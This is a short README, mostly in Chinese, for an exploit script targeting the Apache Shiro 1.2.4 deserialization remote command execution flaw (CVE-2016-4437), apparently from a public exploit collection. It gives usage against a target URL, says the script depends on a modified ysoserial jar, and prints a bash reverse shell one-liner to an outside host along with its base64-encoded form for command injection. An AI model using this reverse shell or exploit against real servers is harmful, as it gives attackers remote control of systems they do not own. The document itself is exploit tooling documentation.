# Readme
shiro &lt;= 1.2.4 反序列化远程命令执行利用脚本
默认仅适配Linux，适配Windows
python脚本需要调用ysoserial-sleep.jar，ysoserial-sleep.jar文件并不是原版的，修改了部分功能，故不要使用原版ysoserial，否则将无法检测  
```
+-------------------------------------------------------------------------------------------------------+
+ DES: By zhzyker as https://github.com/zhzyker/exphub                                                  +
+      Vuln Name: CVE-2016-4437 | Shiro 550  |  Shiro 1.2.4                                             +
+                                                                                                       +
+      Nc shell need encode command: http://www.jackson-t.ca/runtime-exec-payloads.html                 +
+      Original: bash -i >&/dev/tcp/1.1.1.1/233 0>&1                                                    +
+      Encoding: bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvMjMzIDA+JjE=}|{base64,-d}|{bash,-i}  +
+-------------------------------------------------------------------------------------------------------+
+ USE: python3 <filename> <url>                                                                         +
+ EXP: python3 shiro-1.2.4_rce.py http://1.1.1.1:8080                                                   +
+ VER: Apahce Shiro <= 1.2.4                                                                            +
+-------------------------------------------------------------------------------------------------------+
```